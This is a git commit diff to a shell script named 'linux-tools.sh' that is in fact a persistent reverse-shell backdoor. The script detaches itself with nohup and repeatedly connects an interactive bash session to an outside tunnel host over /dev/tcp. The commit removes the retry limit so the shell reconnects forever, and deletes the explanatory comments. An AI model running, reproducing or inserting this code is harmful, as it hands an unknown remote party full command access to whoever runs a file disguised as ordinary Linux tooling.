b0b34e9d6ff74171e386cb1a12233eff7d5313ef
Bug-setup <111661135+FBIking@users.noreply.github.com>
2025-09-29 21:46:32 +0300

    Update linux-tools.sh

--- linux-tools.sh
+++ linux-tools.sh
@@ -2,30 +2,20 @@
 
 HOST="back-wr.gl.at.ply.gg"
 PORT=56262
-MAX_RETRIES=10
-RETRY_INTERVAL=5 # 5 seconds
-
+RETRY_INTERVAL=20 # 5 seconds
 
 connect() {
-    local retries=0
-    while [ $retries -lt $MAX_RETRIES ]; do
-        .
+    while true; do
         /bin/bash -i >& "/dev/tcp/${HOST}/${PORT}" 0>&1
 
-        # If the connection closes, increment retries and wait before trying again.
-        retries=$((retries + 1))
         sleep $RETRY_INTERVAL
     done
 }
 
-# Check for the --background argument to determine if this is the parent or child.
 if [ "$1" == "--background" ]; then
-
     connect
 else
-
     nohup /bin/bash "$0" --background > /dev/null 2>&1 &
 
-    # The parent process exits, freeing up the terminal.
     exit 0
 fi
